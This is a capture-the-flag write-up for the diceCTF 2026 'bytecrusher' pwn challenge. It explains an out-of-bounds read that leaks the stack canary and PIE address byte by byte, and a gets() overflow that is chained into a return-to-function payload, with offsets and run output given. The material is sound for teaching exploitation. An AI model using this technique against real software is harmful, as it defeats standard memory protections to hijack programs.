# bytecrusher

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | diceCTF 2026                   |
| Category    | pwn                            |
| Difficulty  | Medium                         |

## Description
> Dice's new proprietary text crusher is here! Try it out for free with our sixteen free trials of the premium service!

## TL;DR
OOB read in `crush_string()` leaks canary and PIE return address byte-by-byte. `gets()` BOF in `get_feedback()` overwrites return address to `admin_portal()` which reads the flag.

## Initial Analysis

### Reconnaissance

```bash
$ file bytecrusher
bytecrusher: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec --file=bytecrusher
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Full protections: PIE, Canary, NX, Full RELRO.

### Source code review

```c
void admin_portal() {
    // Reads and prints flag.txt — never called (COMPILE_ADMIN_MODE = 0)
}

void crush_string(char *input, char *output, int rate, int output_max_len) {
    if (rate < 1) rate = 1;
    int out_idx = 0;
    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
        output[out_idx++] = input[i];
    }
    output[out_idx] = '\0';
}

void free_trial() {
    char input_buf[32];
    char crushed[32];
    // 16 iterations: fgets(input_buf, 32), scanf rate & output_len, crush_string, puts(crushed)
}

void get_feedback() {
    char buf[16];
    gets(buf);  // classic BOF
}
```

## Identified Vulnerability

### Bug 1: OOB read in crush_string

`crush_string` reads `input[i]` where `i += rate`. With a large `rate`, the loop jumps from `input[0]` directly to `input[rate]`, skipping the null terminator at `input[31]`. This reads arbitrary stack bytes past `input_buf`, including the canary and return address.

### Bug 2: gets() BOF in get_feedback

`gets(buf)` on a 16-byte buffer with no size limit — classic stack buffer overflow.

### Vulnerability Type
CWE-125 (Out-of-bounds Read) + CWE-120 (Buffer Overflow)

## Solution Process

### Step 1: Stack layout analysis (r2)

```
free_trial() stack:
  rbp-0x50  input_buf[32]    ← fgets reads here
  rbp-0x30  crushed[32]      ← crush output written here
  rbp-0x08  canary           ← 8 bytes, byte 0 = 0x00
  rbp+0x00  saved rbp
  rbp+0x08  return address   ← points to main+0x6c (0x15ec)

get_feedback() stack:
  rbp-0x20  buf[16]          ← gets() target
  rbp-0x08  canary
  rbp+0x00  saved rbp
  rbp+0x08  return address
```

### Step 2: OOB read to leak canary and return address

Offsets from `input_buf`:
- Canary byte k: `rate = 0x48 + k` (distance: `0x50 - 0x08 = 0x48`)
- Return address byte k: `rate = 0x58 + k` (distance: `0x50 + 0x08 = 0x58`)

With `output_len=3`, crush_string reads at most 2 chars:
- `output[0] = input[0]` (our known prefix 'X')
- `output[1] = input[rate]` (leaked byte)

Detection: if `puts(crushed)` outputs 2+ chars, byte 1 is the leak. If only 1 char, leaked byte was 0x00.

Iterations needed:
- Canary bytes 1-7: 7 trials (byte 0 always 0x00)
- Return address bytes 0-5: 6 trials (bytes 6-7 always 0x00)
- Total: 13 of 16 available trials

### Step 3: Compute PIE base

Return address = `PIE_base + 0x15ec` (instruction after `call free_trial` in main).

```
pie_base = leaked_ret - 0x15ec
admin_portal = pie_base + 0x12a9
```

### Step 4: Stack overflow in get_feedback

```
payload = 'A' * 24          # buf[16] + 8 bytes padding to canary
       + leaked_canary      # 8 bytes — pass canary check
       + p64(0)             # saved rbp (unused)
       + p64(ret_gadget)    # 0x101a — stack alignment (ret)
       + p64(admin_portal)  # read flag
```

The `ret` gadget at `0x101a` is needed for 16-byte stack alignment before `admin_portal` calls libc functions.

## Execution

```bash
python3 exploit.py           # Local
python3 exploit.py REMOTE    # Remote
python3 exploit.py GDB       # Debug
```

```
[+] Canary: 0x5820ab03c204e900
[+] Return address: 0x59e6ab8075ec
[+] PIE base: 0x59e6ab806000
[+] admin_portal: 0x59e6ab8072a9
[+] Flag: dice{pwn3d_4nd_coRuSh3d}
```

## Flag
```
dice{pwn3d_4nd_coRuSh3d}
```

## Key Lessons
- Large `rate` values in strided copy loops can skip null terminators and leak stack data
- With 16 trials and byte-by-byte leaking (1 byte per trial), 13 trials suffice for canary (7) + PIE return address (6)
- Even with full protections (PIE + Canary + NX + Full RELRO), a controlled OOB read + BOF chain defeats everything
- Always check for `ret` alignment when returning to functions that call libc (movaps crashes on misaligned rsp)
